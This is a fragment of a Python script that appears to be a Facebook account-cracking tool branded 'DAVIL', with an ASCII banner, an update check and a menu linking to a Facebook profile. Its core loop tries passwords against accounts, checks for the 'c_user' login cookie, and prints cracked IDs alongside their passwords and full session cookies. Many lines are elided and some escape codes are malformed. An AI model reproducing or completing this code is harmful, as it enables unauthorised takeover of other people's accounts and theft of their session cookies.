...
logo = """
         ...
         /033[1;37m #######    ######             #       #        #######       ######
--------------------------------------------------
[•] AUTHOR     : /033[1;32mDAVIL/033[1;37m
...
cps = []
try:
    print('/n/033[1;37m[•] WAIT CHECKING FOR UPDATE')
...
except:print('/n/033[1;31mNo internet connection ... \033[0;97m')
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/kokokhan.khan.353?mibextid=avESrC')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[DAVIL-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[DAVIL-CP] '+uid+' | '+ps+'\x1b[1;97m')
